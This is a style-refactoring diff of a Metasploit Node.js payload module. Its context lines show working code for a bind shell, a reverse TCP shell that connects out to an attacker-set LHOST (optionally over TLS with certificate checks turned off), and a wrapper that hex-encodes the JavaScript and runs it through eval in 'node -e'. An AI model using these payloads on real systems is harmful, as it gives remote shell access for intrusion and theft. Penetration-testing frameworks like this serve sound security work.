@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 
@@ -15,7 +16,7 @@ module Msf::Payload::NodeJS
             cp = require("child_process"),
             util = require("util");
 
-        var server = net.createServer(function(socket) {  
+        var server = net.createServer(function(socket) {
           var sh = cp.spawn(cmd, []);
           socket.pipe(sh.stdin);
           util.pump(sh.stdout, socket);
@@ -24,17 +25,17 @@ module Msf::Payload::NodeJS
         server.listen(#{datastore['LPORT']});
       })();
     EOS
-    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
+    cmd.delete("\n").gsub(/\s+/, ' ').gsub(/[']/, '\\\\\'')
   end
 
   # Outputs a javascript snippet that spawns a reverse TCP shell
   # @param [Hash] opts the options to create the reverse TCP payload with
   # @option opts [Boolean] :use_ssl use SSL when communicating with the shell. defaults to false.
   # @return [String] javascript code that executes reverse TCP payload
-  def nodejs_reverse_tcp(opts={})
+  def nodejs_reverse_tcp(opts = {})
     use_ssl = opts.fetch(:use_ssl, false)
-    tls_hash = if use_ssl then '{rejectUnauthorized:false}, ' else '' end
-    net_lib = if use_ssl then 'tls' else 'net' end
+    tls_hash = use_ssl ? '{rejectUnauthorized:false}, ' : ''
+    net_lib = use_ssl ? 'tls' : 'net'
     lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
     # the global.process.mainModule.constructor._load fallback for require() is
     # handy when the payload is eval()'d into a sandboxed context: the reference
@@ -58,13 +59,13 @@ module Msf::Payload::NodeJS
         });
       })();
     EOS
-    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
+    cmd.delete("\n").gsub(/\s+/, ' ').gsub(/[']/, '\\\\\'')
   end
 
   # Wraps the javascript code param in a "node" command invocation
   # @param [String] code the javascript code to run
   # @return [String] a command that invokes "node" and passes the code
   def nodejs_cmd(code)
-    "node -e 'eval(\"#{Rex::Text.to_hex(code, "\\x")}\");'"
+    "node -e 'eval(\"#{Rex::Text.to_hex(code, '\\x')}\");'"
   end
 end
